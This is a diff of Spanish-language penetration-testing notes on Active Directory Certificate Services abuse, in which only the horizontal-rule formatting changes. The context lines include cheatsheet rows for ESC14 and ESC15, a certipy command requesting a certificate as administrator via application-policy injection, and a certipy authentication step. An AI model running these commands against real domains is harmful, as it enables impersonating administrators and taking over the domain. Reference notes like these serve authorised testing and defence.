@@ -31,7 +31,7 @@ linked:
 ---
 # AD CS Abuse
 
-***
+---
 
 ## Cheatsheet
 ^adcs-abuse
@@ -53,7 +53,7 @@ linked:
 | **ESC14** | WeakExplicitMapping / altSecurityIdentities | Editar mapping → cert arbitrario | `certipy` |
 | **ESC15** | v1 template + Client Auth | Inyección SAN en template v1 | `certipy req -application-policies` |
 
-***
+---
 
 ## Descubrimiento
 
@@ -218,7 +218,7 @@ Templates v1 con Client Auth EKU permiten inyección de application policies.
 certipy req -u user -p pass -ca CA -template WebServer -upn administrator@dom.local -application-policies 'Client Authentication'
 ```
 
-***
+---
 
 ## Cadena Shadow Credentials + ADCS
 
@@ -247,4 +247,4 @@ certipy auth -pfx TARGET.pfx -dc-ip DC
 - [HackTricks - ADCS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)
 - [The Hacker Recipes - ADCS](https://www.thehacker.recipes/ad/movement/ad-cs)
 
-***
+---
